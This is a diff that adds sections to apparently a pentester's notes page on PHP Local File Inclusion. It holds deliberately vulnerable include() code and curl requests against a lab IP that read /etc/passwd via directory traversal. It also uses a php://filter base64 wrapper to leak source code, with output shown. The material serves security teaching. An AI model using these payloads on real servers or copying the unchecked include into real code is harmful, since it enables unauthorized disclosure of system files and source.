@@ -4,7 +4,81 @@
 
 Local File Inclusion is a vulnerability that allows us to include files that are on the target server. Server-side languages such as PHP or JSP can dynamically include external scripts, reducing the script's overall size and simplifying the code. Attackers can include both local and remote files if this inclusion logic isn't checked, which could lead to source code leakage, sensitive data exposure, and code execution under some circumstances.
 
-## LFI Examples
+## LFI 
+
+First, there must be a functionality that includes files.
+
+Source Code Example:
+
+```php
+<?php
+    $filename = $_GET['file'];
+    include($filename);
+?>
+```
+
+With this we can include any file on the system and display its contents on the web:
+
+```text
+http://192.168.28.152/example.php?file=/etc/passwd
+```
+
+We can use curl, a browser or anything that renders URLs.
+
+```text
+❯ curl 'http://192.168.28.152/example.php?file=/etc/passwd'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+...
+<SNIP>
+```
+
+However, with curl we have more control over what we want to do, in this case we can use bash and some tools to filter the output like so:
+
+```text
+❯ curl -s 'http://192.168.28.152/example.php?file=/etc/passwd' | grep 'sh$'
+root:x:0:0:root:/root:/bin/bash
+suer:x:1000:1000:user,,,:/home/suer:/bin/bash
+```
+
+### LFI with Directory Traversal
+
+```php
+<?php
+    $filename = $_GET['file'];
+    include("/var/www/html" . $filename);
+?>
+```
+
+Since the directory is explicitly indicated under `/var/www/html` which are 3 directories `/1/2/3` then we must go 3 directories back with `../` so it'll look like this:
+
+```text
+❯ curl -s 'http://192.168.28.152/directory_traversal.php?file=../../../../etc/passwd' | grep 'sh$'
+root:x:0:0:root:/root:/bin/bash
+suer:x:1000:1000:user,,,:/home/suer:/bin/bash
+```
+
+Alternatively, we can go back more than 3 times and it'll still work:
+
+```text
+root@ubuntu:/var/www/html# pwd
+/var/www/html
+root@ubuntu:/var/www/html# cd ../../../../../../../../
+root@ubuntu:/# pwd
+/
+```
+
+```text
+❯ curl -s 'http://192.168.28.152/directory_traversal.php?file=../../../../../../../etc/passwd' | grep 'sh$'
+root:x:0:0:root:/root:/bin/bash
+suer:x:1000:1000:user,,,:/home/suer:/bin/bash
+```
 
 ### LFI with Path Traversal
 
@@ -68,6 +142,25 @@ include($_GET['language'] . ".php");
 ## Wrappers
 
 {% embed url="https://www.php.net/manual/en/wrappers.php" %}
+
+### PHP Wrapper
+
+We can the PHP wrapper base64 function to convert the contents of a resource to base64 encoding:
+
+```text
+❯ curl -s 'http://192.168.28.152/example.php?file=php://filter/convert.base64-encode/resource=comment.php'
+PD9waHAKCSRmaWxlbmFtZSA9ICRfR0VUWydmaWxlJ107CglpbmNsdWRlKCRmaWxlbmFtZSk7IC8vIFRoaXMgaXMgYSBjb21tZW50Cj8+Cg==
+```
+
+Then, we can decode it and read the source:
+
+```text
+❯ echo 'PD9waHAKCSRmaWxlbmFtZSA9ICRfR0VUWydmaWxlJ107CglpbmNsdWRlKCRmaWxlbmFtZSk7IC8vIFRoaXMgaXMgYSBjb21tZW50Cj8+Cg==' | base64 -d
+<?php
+        $filename = $_GET['file'];
+        include($filename); // This is a comment
+?>
+```
 
 ### Expect Wrapper
 
